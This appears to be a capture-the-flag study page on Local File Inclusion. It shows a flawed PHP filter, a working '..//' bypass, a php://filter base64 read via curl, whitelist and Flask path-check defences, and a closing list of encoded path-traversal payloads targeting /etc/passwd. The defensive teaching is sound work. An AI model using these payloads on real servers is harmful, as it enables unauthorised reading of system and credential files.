# Local File Inclusion (LFI)

- [Introduction](#introduction)
- [Filtering](#filtering)
- [PHP Filter Convert Base64 Encode](#php-filter-convert-base64-encode)
- [Whitelisting](#whitelisting)
- [Path Checks](#path-checks)
- [Sameple Payloads](#sample-payloads)

## Introduction

Originally I thought that local file inclusion was just tricking web servers into exposing files. This vulnerability is more than just that. It also includes running files on the web server.

In some capture the flag events, these show up in web applications for a pages that show the contents of files. These pages often have a url similar to `http://target.thm/some/page?path=/var/www/html/secret.txt`.

The problem is that users can alter the path parameter and often times the server side code doesn't validate it. Nothing is stopping the user from typing `http://target.thm/some/page?path=/etc/passwd` and seeing what users are on the server.

I can attach a fuzzer to this page and try to find any and all well-know sensitive files on a server. The ability to read files on a server greatly increases the attack surface because now I can examine code and find vulnerabilties in those files as well.

## Filtering

I can't stress this enough, filtering is good but it is not an optimal solution. Time after time, developers try to filter what can be input by users and bad actors keep finding ways to bypass the filtering.

I recently finished a capture the flag event that contained a LFI vulnerability. The url was something like `http://mysite.thm/test.php?path=/var/www/html/someFile.php`. The code was printing the contents of the file in the path parameter.

I saw the path and tried to get the `/etc/passwd` contents to print to the screen. I started with `http://mysite.thm/test.php?path=/etc/password` and `http://mysite.thm/test.php?path=/var/www/html/../../../etc/passwd`. Both urls returned an error message that the provided paths were not allowed. This let me know that the server was doing some validation and the paths I provided were failing.

I decided to take another approach and view the contents of the file that I was on. I changed the url to `http://mysite.thm/test.php?path=/test.php` and saw the following contents:

```php
<!DOCTYPE HTML>
<html>
<head>
    <title>Test page</title>
    <h1>Test Page. Do not deploy</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/someFile.php"><button>Here is a button</button></a><br>
        <?php
          function containsStr($str, $substr) {
            return strpos($str, $substr) !== false;
          }
          if(isset($_GET["path"])){
            if(!containsStr($_GET['path'], '../..') && containsStr($_GET['path'], '/var/www/html')) {
              include $_GET['path'];
            } else {
              echo 'Sorry, Thats not allowed';
            }
          }
        ?>
    </div>
</body>

</html>
```

This filtering is very similar to what a lot of developers do. Most developers would probably think that this filtering is secure. They believe they have restricted all requests to files in the `/var/www/html` directory. The problem is that this filtering is very easy to bypass.

First, I need to make sure that `/var/www/html` is part of my path and second, my path can't include `../..`. The following is a valid request that will bypass the filtering above that most developers would think is safe and display the contents of the `/etc/passwd` file:

`http://mysite.thm/test.php?path=/var/www/html/..//..//..//etc/passwd`

Linux will change the `//` to a single `/` character. That path will bypass the filtering and gloriously show the contents of `/etc/passwd` on the page.

**Again, I can't stress this enough, filtering is not enough.**

### PHP Filter Convert Base64 Encode

Sometimes the text of a file will not display correctly or it will cause a server side error when trying to render. PHP has provided a mechanism to take the content of a file and encode it using base64 so that it can be rendered.

A path is provided and PHP will take that path, read the file at the path location and convert the contents to base64 encoding. The url has the following format:

`php://filter/convert.base64-encode/resource=/encode/this/file.txt`

This url tells PHP where the file is (`resource=/encode/this/file.txt`) and what function to run on the file (`filter/convert.base64-encode`). There is also a `filter/convert.base64-decode` function to decode base64 files on a target machine with similar syntax.

If the content at `http://mysite.thm/test.php?path=/var/www/html/..//..//..//etc/passwd` was not able to render I would modify the url to:

`http://mysite.thm/test.php?path=php://filter/convert.base64-encode/resource=/var/www/html/..//..//..//etc/passwd`

I can then take that output and send it over to [CyberChef](https://gchq.github.io/CyberChef/) or use the `base64 -d` command on Linux. The command line option would look like the following:

```bash
$ curl http://mysite.thm/test.php?path=php://filter/convert.base64-encode/resource=/var/www/html/..//..//..//etc/passwd | base64 -d
Here are my contents in plain text!
```

## Whitelisting

A better approach is to check the path variable against a whitelist. That way, only approved files will have their contents shown.

So if I am expecting this url to be used with only three different files and all of them are in th the `/var/www/html` directory, I would change the resource to just take a file name instead of a whole path. If the three files where:

- players.txt
- coaches.txt
- teams.txt

Now the request just needs to check if what the user typed is in the list above. If they include any other path traversal items (../), the request will get an error response.

The main drawback to this approach is that the whitelist must be maintained. This means it is a code change if the list is hard coded in the file, files that were removed need to be removed from the whitelist and files that were added need to be included on the whitelist. However, if the list is too unweildy, it can be placed in a datastore so that a code change is not needed. Also, the security benefits of a whitelist outweigh the security drawbacks of using filtering.

## Path Checks

There is another way to prevent local file inclusion attacks. Multiple programming languages have the ability to resolve paths (including symlinks) to file out what the actual path of the file being requested is. For example, here is a Python snippet for a Flask endpoint that prevents local file inclusion attacks:

```python
import os
import urllib.parse

from flask import Flask, request, send_file


app = Flask(__name__)
# All files that are are available to be shown will be in the 'files' directory
BASE_DIR = os.path.realpath(os.path.join(os.getcwd(), "files"))


@app.route("/get_file")
def get_file():
    filename = request.args.get("file")
    if not filename:
        return "Missing filename", 400

    # Normalize and resolve the full path
    requested_path = os.path.realpath(os.path.join(BASE_DIR, urllib.parse.unquote(filename)))

    # Ensure the resolved path is within the files directory
    if not requested_path.startswith(BASE_DIR):
        return "Invalid file path", 403

    # Ensure it's a file and not a directory
    if not os.path.isfile(requested_path):
        return "File not found", 404

    return send_file(requested_path)
```

## Sample Payloads

Using the url `http://mysite.thm/test.php?path=<path_goes_here>` I am going to give some different path examples. There are a lot of ways that a url can be encoded to bypass filtering and so I want to provide simple examples and ones that are specific for servers and configuration.

Here are some basic payloads that can be tried:

### `http://mysite.thm/test.php?path=../../../../etc/passwd`

This is the baseline example to show what a basic attack looks like. The slashes and dots are not encoded. If this works, I can promise that the website was not built with security in mind.

### `http://mysite.thm/test.php?path=..//..//..//etc/passwd`

This payload was mentioned in the [PHP Filter Convert Base64 Encode](#php-filter-convert-base64-encode) section earlier on this page. The double forward slash (//) becomes a single forward slash.

### `http://mysite.thm/test.php?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd`

This payload is used to get around filtering checks that are looking for a forward slash (or two dots before a forward slash) in the url. The interesting part is that `%2F` or `%2f` are the url encoded version of a forward slash. So this path resolves from `..%2F` to `../`.

### `http://mysite.thm/test.php?path=..%252F..%252F..%252F..%252Fetc%252Fpasswd`

This is the same as the previous, the `%` has been url encoded. It is a double encoding example.

### `http://mysite.thm/test.php?path=.%2E/.%2E/.%2E/etc/passwd`

This payload is fantastic to get around filtering checks that are looking for a double period in the url. The interesting part is that `%2E` or `%2e` are the url encoded version of a period. So this path resolves from `.%2E/` to `../`.

### `http://mysite.thm/test.php?path=.%%32%65/.%%32%65/.%%32%65/etc/passwd`

This is the same as the previous example except it url encoded `%2E` to become `%%32%65`. Depending on how things are filtered, this can resolve to a period.

### `http://mysite.thm/test.php?path=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`

This is a full encoding of both the periods and the forward slashes.

### `http://mysite.thm/test.php?path=%C0%AE%C0%AE%2F%C0%AE%C0%AE%2F%C0%AE%C0%AE%2F%C0%AE%C0%AE%2Fetc%2Fpasswd`

Overlong UTF-8 encoding.

### `http://mysite.thm/test.php?path=../../../../etc/passwd%00`

The `%00` character is a null byte character and it ends a string. This would work for misconfigured servers and PHP <5.4 servers.

### `http://mysite.thm/test.php?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd%00`

Same as the above but with url encoding for the forward slash.

### `http://mysite.thm/test.php?path=..\\..\\..\\..\\etc\\hosts`

For Windows targets or ones that did a poor job with input sanitation.

### `http://mysite.thm/test.php?path=....//....//....//....//etc/passwd`

This is called dot padding and it can bypass some naive regex checks.

### `http://mysite.thm/test.php?path=\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd`

This uses Unicode escapes.
